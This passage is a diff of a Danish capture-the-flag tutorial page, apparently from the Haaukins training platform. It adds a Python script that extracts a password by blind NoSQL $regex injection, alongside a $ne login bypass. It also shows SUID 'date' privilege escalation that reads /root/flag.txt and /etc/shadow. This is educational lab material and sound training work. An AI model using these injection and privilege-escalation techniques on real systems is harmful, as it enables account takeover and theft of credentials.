@@ -28,9 +28,27 @@
   -d '{"username":{"$ne":null},"password":{"$ne":null}}' http://hackswag.hkn/api/v1/users/login
 #  -> {"token":"eyJ..."}  (logget ind som første bruger "quantumpulse")</code></pre>
 <h2>2. Blind $regex-ekstraktion af passwordet</h2>
-<p>Login giver 200/401 som orakel — udtræk passwordet tegn-for-tegn:</p>
-             <pre><code>{"username":"quantumpulse","password":{"$regex":"^&lt;prefix&gt;"}}   # 200 hvis match
+<p>Login-svaret (200 vs. 401) er et orakel: <code>$regex</code> matcher kun hvis det
+             gættede prefix rent faktisk er starten af det RIGTIGE password. Det betyder du kan bygge
+             passwordet ét tegn ad gangen, i stedet for at gætte det hele:</p>
+             <pre><code>import requests, string
+url = "http://hackswag.hkn/api/v1/users/login"
+found = ""
+while True:
+    for c in string.ascii_letters + string.digits:
+        guess = found + c
+        r = requests.post(url, json={"username": "quantumpulse",
+                                      "password": {"$regex": f"^{guess}"}})
+        if r.status_code == 200:
+            found = guess
+            print(found)
+            break
+    else:
+        break   # intet tegn matchede => found er hele passwordet
 # -> quAGQNEhdpKkwB4jX6y3MWmS8gT2vCJP (32 tegn)</code></pre>
+             <p>For hver position prøves hvert muligt tegn som NÆSTE tegn i prefixet; det der giver 200 er
+             det rigtige, og du rykker én position frem. Samme idé som blind/time-based SQLi, bare med
+             <code>$regex</code> som mekanismen.</p>
 <h2>3. SSH + privesc via SUID date</h2>
 <pre><code>ssh quantumpulse@&lt;ip&gt;   # det udtrukne password
 find / -perm -4000 -type f 2>/dev/null     # /bin/date = SUID root!
@@ -41,7 +59,15 @@ date -f /root/flag.txt      # GTFObins: læser filen som root, fejler med indhol
         <p>(Bonus-vuln: JWT HS256 med tom secret <code>""</code> → tokens kan forges, men API'et har ingen andre endpoints.)</p>
 </details>
 <h2>Hvad du har lært</h2>
-<ul><li>Usaniteret JSON-login = NoSQL-operator-injection (<code>$ne</code>, <code>$regex</code>) → bypass + blind ekstraktion.</li><li>SUID <code>date -f &lt;fil&gt;</code> læser en root-fil (GTFObins); verificér med <code>date -f /etc/shadow</code>.</li></ul>
+<ul><li>Usaniteret JSON-login = NoSQL-operator-injection (<code>$ne</code>, <code>$regex</code>) giver bypass + blind ekstraktion.</li><li>SUID <code>date -f &lt;fil&gt;</code> læser en root-fil (GTFObins); verificér med <code>date -f /etc/shadow</code>.</li></ul>
+<h2>Hvor ses dette igen?</h2>
+<p>NoSQL-injection er SQLi's mindre kendte fætter: når et login tager JSON og ikke tjekker
+typerne, kan du sende MongoDB-operatorer (<code>$ne</code> = "not equal", <code>$regex</code> =
+mønster) i stedet for strenge. <code>$ne:null</code> matcher enhver bruger (auth-bypass), og
+<code>$regex</code> gør login-svaret til et orakel du kan udtrække passwordet tegn-for-tegn med.
+Og privesc-delen viser mønstret igen: en uventet SUID-binær (<code>date</code>!) plus et
+<a href="https://gtfobins.github.io/" target="_blank">GTFObins</a>-opslag giver fil-læsning som
+root. Hvert almindeligt værktøj kan misbruges hvis det har SUID-bit.</p>
 <footer>
 Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
 er en dansk undervisningsplatform til sikkerhedstræning (AAU / De Danske Cybermesterskaber) — alle opgaver
